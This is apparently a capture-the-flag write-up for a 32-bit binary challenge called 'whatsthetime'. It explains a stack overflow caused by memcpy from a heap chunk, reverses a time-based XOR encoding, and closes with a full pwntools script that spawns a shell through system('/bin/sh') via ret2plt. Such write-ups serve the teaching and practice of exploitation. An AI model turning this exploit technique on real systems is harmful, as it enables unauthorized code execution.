## tags: `ret2plt`, `BOF`
___
### Challenge info:

We are provided with a single binary file:
```c
└─$ ls
whatsthetime
```

File info:
```c
└─$ file whatsthetime 
whatsthetime: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=23bd0f9855066bfed7d759c6460b20b9086e51a1, for GNU/Linux 4.4.0, not stripped
```
* The file is 32-bit architecture, so we will be working with 4 bytes memory block 
```c
└─$ checksec --file=whatsthetime 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   52 Symbols  No     0               3               whatsthetime
```
* Nearly all the protections are disabled except for NX

___
Code from Ghidra:

`main()`:
```c
undefined4 main(void)
{
  time_t curr_time;
  char *time_str;
  int time_min;
  int xor_key;
  undefined1 *stack_ref;
  
  stack_ref = &stack0x00000004;
  curr_time = time((time_t *)0x0);
  time_min = (curr_time / 60) * 60;
  xor_key = time_min;
  puts("I think one of my watch hands fell off!");
  time_str = ctime(&time_min);
  printf("Currently the time is: %s",time_str);
  read_user_input(xor_key);
  return 0;
}
```
* `curr_time`: receives raw `time()` return value
* `time_min`: rounds the raw value into minutes (which also mean a 60-second window to brute-force)
* `xor_key`: has the same value as `time_min`
Then we pass `xor_key` value to the next function: `read_user_input()`

`read_user_input()`:
```c
void read_user_input(int xor_key)
{
  undefined1 buffer [40];
  size_t len;
  void *chunk;
  int j;
  int i;
  
  setvbuf(_stdout,(char *)0x0,2,0);
  setvbuf(_stdin,(char *)0x0,2,0);
  chunk = malloc(160);
  len = read(0,chunk,160);
  for (i = 0; i < (int)len; i = i + 4) {
    for (j = 0; j < 4; j = j + 1) {
      *(byte *)((int)chunk + j + i) =
           *(byte *)((int)chunk + j + i) ^ (byte)(xor_key >> ((byte)(j << 3) & 31));
    }
    xor_key = xor_key + 1;
  }
  memcpy(buffer,chunk,len);
  write(1,buffer,40); // skip
  return;
}
```
* Allocate a big chunk on heap and require data input from us:
  ```c
  chunk = malloc(160);
  ```
* On the next snippet, the data inside the chunk is getting XOR-encoded by the program
  ```c
  for (i = 0; i < (int)len; i = i + 4) {
    for (j = 0; j < 4; j = j + 1) {
      *(byte *)((int)chunk + j + i) =
           *(byte *)((int)chunk + j + i) ^ (byte)(xor_key >> ((byte)(j << 3) & 31));
    }
    xor_key = xor_key + 1;
  }
  ```
  * going through 4 bytes block each in chunkdata
  * then encode each byte with modified XOR value
  * `xor_key` then increments after each iteration of a block
* Next, we found a BOF bug on this line:
  ```c
  memcpy(buffer,chunk,len);
  ```
  * it copies all the data from chunk to buffer
  * notice that chunk is `160 bytes` large on **heap** while buffer is only `40 bytes` on **stack**
  ```c
  undefined1 buffer [40];
  ...
  chunk = malloc(160);
  len = read(0,chunk,160);
  ...
  memcpy(buffer,chunk,len);
  ```  

`win()`:
```c
void win(void)
{
  printf("%s %s...","Executing shell","/bin/sh");
  system("ls");
  printf("oops wrong command");
  return;
}
```
* a hidden function that isnt called in the main program
* could be a `ret2win` chall since it contains `system()` function, however it calls to command `'ls'` (prints out the files in directory)
* fortunately, we have other way around
  * there is a fixed `system@plt` from the binary (since No PIE)
    ```asm
    [0x804c020] system@GLIBC_2.0 -> 0x80490b6 (system@plt+6) ◂— push 0x40
    ```
  * there is also `"/bin/sh"` strings exist in the binary's `.rodata`

    <img width="473" height="99" alt="image" src="https://github.com/user-attachments/assets/b859cbef-e7e2-46a4-8264-abb8594a1155" />


with BOF, we can skip `win()` entirely, and call `system()` directly with the string `"/bin/sh"`'s address
___
### Exploit:

We can input data in `read_user_input()`:
```c
  chunk = malloc(160);
  len = read(0,chunk,160);
```
So we can insert our payload into the chunk

Then the payload will be copied entirely to buffer on the stack, which cause `stack overflow`
```c
memcpy(buffer,chunk,len);
```

Simple as it is, BUT the payload get `XOR'd` in between. So we have to pre-XOR the payload to reverse the operation (since XOR is symmetric: send = desired ^ key)

Based on the `xor_key` creation in `main()` and the encoding operation in `read_user_input()`, we can reverse engineer the code logic:

* `xor_key`:
  ```python
	import time
	  
	curr_time = int(time.time())
	xor_key = (curr_time // 60) * 60
  ```
* `xor_tool`:
  ```python
  def xor_tool(xor_key, payload):
	payload = bytearray(payload)
	length = len(payload) 

	for i in range(0, length, 4):
		for j in range(0, 4):

			val = xor_key >> ((j << 3) & 31)
			val = val & 0xff
			payload[i + j] ^= val

		xor_key = xor_key + 1

	return payload
  ```
The last thing to do is create our payload:
```python
# construct the payload
offset_to_rip = 17
payload = (b'A' * 4) * offset_to_rip  // padding to RIP
payload += p32(system)			      // overwrite RIP -> system
payload += p32(0xdeadbeef)			  // ret_adddr
payload += p32(bin_sh)				  // argument: "/bin/sh"
```
This payload equals to calling: `system("/bin/sh")`

Finally, let the script run and we have our result:

* our gadgets:

<img width="810" height="68" alt="image" src="https://github.com/user-attachments/assets/70362498-2598-462f-9df4-938bf238d994" />

* inside heapchunk:

<img width="805" height="357" alt="image" src="https://github.com/user-attachments/assets/7ae5c7ad-e676-4367-97e0-2af9f65de9fd" />

* to stack (after `memcpy()`):

<img width="806" height="480" alt="image" src="https://github.com/user-attachments/assets/fa2635d6-5ec4-42e2-b1a3-db61a2c65398" />

* and when the program returns, we have the shell:

<img width="802" height="238" alt="image" src="https://github.com/user-attachments/assets/6edde442-588a-4498-990b-ebdb7e0dac0e" />

___
Final script: `script.py`
```python
from pwn import *
import time

context.binary = exe = ELF("./whatsthetime", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br read_user_input 
		br *read_user_input + 67 
		br *read_user_input + 72 
		br *read_user_input + 226 
		br *read_user_input + 231 

		''')

def xor_tool(xor_key, payload):
	payload = bytearray(payload)
	length = len(payload) 

	for i in range(0, length, 4):
		for j in range(0, 4):

			val = xor_key >> ((j << 3) & 31)
			val = val & 0xff
			payload[i + j] ^= val

		xor_key = xor_key + 1

	return payload

p = process(exe.path)
GDB()

# prepare the XOR key
curr_time = int(time.time())
xor_key = (curr_time // 60) * 60

# prepare the gadgets
system = exe.plt["system"]
bin_sh = next(exe.search(b"/bin/sh"))
print(f"system: {hex(system)}")
print(f"bin_sh: {hex(bin_sh)}")

# construct the payload
offset_to_rip = 17
payload = (b'A' * 4) * offset_to_rip
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

payload = xor_tool(xor_key, payload)

p.sendline(payload) 

p.interactive()
```
___






